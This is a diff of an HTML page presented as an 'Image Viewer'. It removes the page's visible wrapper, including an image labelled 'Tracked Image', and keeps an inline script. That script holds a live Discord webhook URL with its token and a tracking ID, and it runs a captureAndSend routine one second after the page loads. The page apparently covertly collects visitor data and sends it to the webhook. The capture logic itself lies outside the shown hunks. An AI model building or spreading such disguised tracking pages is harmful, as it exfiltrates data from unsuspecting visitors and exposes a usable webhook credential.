@@ -1,47 +1,3 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Viewer</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            background: #1a1a1a;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 90%;
-            text-align: center;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-        .status {
-            color: #00ff00;
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(0,255,0,0.1);
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2 style="color: white;">🖼️ Image Viewer</h2>
-        <div id="status" class="status">⏳ Loading...</div>
-        <img id="targetImage" src="Captura de pantalla 2026-03-16 060146_view.png" alt="Tracked Image">
-    </div>
-
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484358816933085287/N16XtmubEfoR7eOmMH9-cX-q_RDXS55O93qAw_s3f-km4TVnsLLuxVBqLhztbOnKtbiL';
         const TRACKING_ID = 'bc13fcf6';
@@ -140,5 +96,3 @@
             setTimeout(captureAndSend, 1000);
         });
     </script>
-</body>
-</html>
